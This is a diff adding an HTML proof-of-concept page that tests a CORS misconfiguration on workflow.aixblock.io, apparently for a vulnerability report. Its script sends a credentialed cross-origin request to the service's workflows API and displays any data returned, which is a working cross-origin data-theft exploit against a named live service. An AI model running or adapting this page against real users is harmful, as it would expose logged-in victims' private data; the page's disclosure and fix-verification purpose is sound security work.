@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AIxBlock CORS Vulnerability Proof of Concept</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            color: #d32f2f;
+            margin-bottom: 30px;
+        }
+        .status {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        .vulnerable {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef5350;
+        }
+        .secure {
+            background-color: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #4caf50;
+        }
+        .testing {
+            background-color: #fff3e0;
+            color: #ef6c00;
+            border: 1px solid #ff9800;
+        }
+        .code {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+        .button {
+            background-color: #1976d2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        .button:hover {
+            background-color: #1565c0;
+        }
+        .button.danger {
+            background-color: #d32f2f;
+        }
+        .button.danger:hover {
+            background-color: #c62828;
+        }
+        .warning {
+            background-color: #fff3e0;
+            border: 1px solid #ff9800;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .info {
+            background-color: #e3f2fd;
+            border: 1px solid #2196f3;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 AIxBlock CORS Vulnerability PoC</h1>
+            <p>Proof of Concept for CORS Misconfiguration on workflow.aixblock.io</p>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is a security demonstration. Only use this on systems you own or have explicit permission to test.
+        </div>
+
+        <div class="info">
+            <strong>ℹ️ Instructions:</strong>
+            <ol>
+                <li>Make sure you're logged into <code>workflow.aixblock.io</code> in another tab</li>
+                <li>Click "Test CORS Vulnerability" below</li>
+                <li>If vulnerable: You'll see workflow data from the API</li>
+                <li>If fixed: You'll see a CORS error message</li>
+            </ol>
+        </div>
+
+        <div id="status" class="status testing">
+            Ready to test CORS vulnerability...
+        </div>
+
+        <div style="text-align: center; margin: 30px 0;">
+            <button class="button danger" onclick="testCORSVulnerability()">
+                🧪 Test CORS Vulnerability
+            </button>
+            <button class="button" onclick="testLegitimateAccess()">
+                ✅ Test Legitimate Access
+            </button>
+            <button class="button" onclick="clearResults()">
+                🗑️ Clear Results
+            </button>
+        </div>
+
+        <div id="results" style="margin-top: 30px;">
+            <h3>Test Results:</h3>
+            <div id="output" class="code">
+                Click a button above to start testing...
+            </div>
+        </div>
+
+        <div id="technical-details" style="margin-top: 30px; display: none;">
+            <h3>Technical Details:</h3>
+            <div class="code" id="technical-output">
+                <!-- Technical details will be populated here -->
+            </div>
+        </div>
+
+        <div style="margin-top: 30px; padding: 20px; background-color: #f9f9f9; border-radius: 5px;">
+            <h3>What This Test Does:</h3>
+            <ul>
+                <li><strong>Vulnerability Test:</strong> Attempts to access AIxBlock APIs from this malicious domain</li>
+                <li><strong>Legitimate Test:</strong> Tests if legitimate origins still work after fix</li>
+                <li><strong>Security Impact:</strong> If vulnerable, any website can access your workflow data</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        function updateStatus(message, type) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = `status ${type}`;
+        }
+
+        function updateOutput(content) {
+            document.getElementById('output').innerHTML = content;
+        }
+
+        function updateTechnicalDetails(content) {
+            document.getElementById('technical-output').innerHTML = content;
+            document.getElementById('technical-details').style.display = 'block';
+        }
+
+        function clearResults() {
+            updateStatus('Ready to test CORS vulnerability...', 'testing');
+            updateOutput('Click a button above to start testing...');
+            document.getElementById('technical-details').style.display = 'none';
+        }
+
+        async function testCORSVulnerability() {
+            updateStatus('Testing CORS vulnerability...', 'testing');
+            updateOutput('Testing malicious cross-origin access to AIxBlock APIs...\n\n');
+
+            const technicalDetails = [];
+            let output = '';
+
+            try {
+                // Test 1: Basic CORS preflight
+                output += '1. Testing CORS preflight request...\n';
+                technicalDetails.push('Testing OPTIONS request to workflow.aixblock.io');
+                
+                const preflightResponse = await fetch('https://workflow.aixblock.io/api/workflows', {
+                    method: 'OPTIONS',
+                    headers: {
+                        'Origin': window.location.origin,
+                        'Access-Control-Request-Method': 'GET',
+                        'Access-Control-Request-Headers': 'Content-Type'
+                    }
+                });
+
+                const corsHeaders = {
+                    'Access-Control-Allow-Origin': preflightResponse.headers.get('Access-Control-Allow-Origin'),
+                    'Access-Control-Allow-Credentials': preflightResponse.headers.get('Access-Control-Allow-Credentials'),
+                    'Access-Control-Allow-Methods': preflightResponse.headers.get('Access-Control-Allow-Methods'),
+                    'Access-Control-Expose-Headers': preflightResponse.headers.get('Access-Control-Expose-Headers')
+                };
+
+                output += `   Status: ${preflightResponse.status}\n`;
+                output += `   CORS Headers:\n`;
+                Object.entries(corsHeaders).forEach(([key, value]) => {
+                    output += `     ${key}: ${value || 'Not Set'}\n`;
+                });
+
+                technicalDetails.push(`Preflight Response: ${preflightResponse.status}`);
+                technicalDetails.push(`CORS Headers: ${JSON.stringify(corsHeaders, null, 2)}`);
+
+                // Check if vulnerable
+                const isVulnerable = corsHeaders['Access-Control-Allow-Origin'] === '*' && 
+                                   corsHeaders['Access-Control-Allow-Credentials'] === 'true';
+
+                if (isVulnerable) {
+                    output += '\n   ❌ VULNERABLE: Wildcard origin with credentials!\n\n';
+                    
+                    // Test 2: Actual data access
+                    output += '2. Testing actual data access...\n';
+                    technicalDetails.push('Attempting to access workflow data with credentials');
+
+                    try {
+                        const dataResponse = await fetch('https://workflow.aixblock.io/api/workflows', {
+                            method: 'GET',
+                            credentials: 'include',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        });
+
+                        output += `   Status: ${dataResponse.status}\n`;
+                        
+                        if (dataResponse.ok) {
+                            const data = await dataResponse.text();
+                            output += `   ✅ SUCCESS: Retrieved data from AIxBlock!\n`;
+                            output += `   Data length: ${data.length} characters\n`;
+                            output += `   Preview: ${data.substring(0, 200)}...\n\n`;
+                            
+                            technicalDetails.push(`Data Access: SUCCESS (${dataResponse.status})`);
+                            technicalDetails.push(`Data Length: ${data.length} characters`);
+                            
+                            updateStatus('🚨 VULNERABILITY CONFIRMED: CORS allows unauthorized access!', 'vulnerable');
+                        } else {
+                            output += `   ❌ Data access blocked (${dataResponse.status})\n\n`;
+                            technicalDetails.push(`Data Access: BLOCKED (${dataResponse.status})`);
+                        }
+                    } catch (dataError) {
+                        output += `   ❌ Data access failed: ${dataError.message}\n\n`;
+                        technicalDetails.push(`Data Access Error: ${dataError.message}`);
+                    }
+                } else {
+                    output += '\n   ✅ SECURE: CORS properly configured!\n\n';
+                    technicalDetails.push('CORS Configuration: SECURE');
+                    updateStatus('✅ CORS is properly configured - no vulnerability found', 'secure');
+                }
+
+            } catch (error) {
+                output += `❌ Error during testing: ${error.message}\n\n`;
+                technicalDetails.push(`Test Error: ${error.message}`);
+                updateStatus('❌ Error during testing', 'testing');
+            }
+
+            updateOutput(output);
+            updateTechnicalDetails(technicalDetails.join('\n\n'));
+        }
+
+        async function testLegitimateAccess() {
+            updateStatus('Testing legitimate access...', 'testing');
+            updateOutput('Testing if legitimate origins still work after fix...\n\n');
+
+            const technicalDetails = [];
+            let output = '';
+
+            try {
+                // Test legitimate origins
+                const legitimateOrigins = [
+                    'https://app.aixblock.io',
+                    'https://workflow.aixblock.io',
+                    'https://workflow-live.aixblock.io'
+                ];
+
+                for (const origin of legitimateOrigins) {
+                    output += `Testing origin: ${origin}\n`;
+                    technicalDetails.push(`Testing legitimate origin: ${origin}`);
+
+                    try {
+                        const response = await fetch('https://workflow.aixblock.io/api/workflows', {
+                            method: 'OPTIONS',
+                            headers: {
+                                'Origin': origin,
+                                'Access-Control-Request-Method': 'GET'
+                            }
+                        });
+
+                        const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
+                        output += `   Status: ${response.status}\n`;
+                        output += `   Allow-Origin: ${allowOrigin || 'Not Set'}\n`;
+
+                        if (allowOrigin === origin || allowOrigin === '*') {
+                            output += `   ✅ Allowed\n\n`;
+                            technicalDetails.push(`Result: ALLOWED (${response.status})`);
+                        } else {
+                            output += `   ❌ Blocked\n\n`;
+                            technicalDetails.push(`Result: BLOCKED (${response.status})`);
+                        }
+                    } catch (error) {
+                        output += `   ❌ Error: ${error.message}\n\n`;
+                        technicalDetails.push(`Error: ${error.message}`);
+                    }
+                }
+
+                updateStatus('✅ Legitimate access testing completed', 'secure');
+
+            } catch (error) {
+                output += `❌ Error during legitimate testing: ${error.message}\n\n`;
+                technicalDetails.push(`Legitimate Test Error: ${error.message}`);
+                updateStatus('❌ Error during legitimate testing', 'testing');
+            }
+
+            updateOutput(output);
+            updateTechnicalDetails(technicalDetails.join('\n\n'));
+        }
+
+        // Initialize
+        clearResults();
+    </script>
+</body>
+</html>
